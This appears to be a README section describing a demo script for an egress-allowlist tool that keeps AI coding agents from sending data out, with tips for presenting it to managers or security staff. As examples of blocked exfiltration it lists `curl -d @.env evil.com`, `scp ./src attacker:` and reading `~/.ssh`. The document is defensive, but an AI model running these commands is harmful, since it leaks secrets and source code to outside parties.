# Demos

## `sanctioned-ai-demo.sh` — the 2-minute story

A self-contained, safe walkthrough you can run in front of a manager, IT/security,
or a prospective customer. It tells the whole "sanctioned agentic AI" pitch:

1. The risk today — with no guardrail, an agent can send your code anywhere.
2. Turn on the egress allowlist (IT sets the policy).
3. Developers keep working — normal agent activity (Anthropic API, git, npm,
   localhost) flows with zero friction.
4. Exfiltration is stopped cold — `curl -d @.env evil.com`, `scp ./src attacker:`,
   reading `~/.ssh` are all blocked.
5. The proof you hand to security — the audit log of every blocked attempt.

```bash
./demo/sanctioned-ai-demo.sh          # live: pauses between acts
./demo/sanctioned-ai-demo.sh --fast   # no pauses (good for screen recording)
```

**Completely safe to run.** Every "agent command" is only *evaluated* with
`sentryctl check` — nothing is ever executed. It runs against a throwaway config
in a temp directory and never touches your real `~/.agentsentry` setup.

### Tips for showing it live

- Run `--fast` once to rehearse, then run interactively for the real thing so you
  can talk over each act.
- The one line to land: *"Let your developers use Claude Code and Codex — and
  give security the audit trail and egress control to allow it."*
- Record it with [asciinema](https://asciinema.org) or a screen capture and drop
  the GIF into the README / a sales deck.
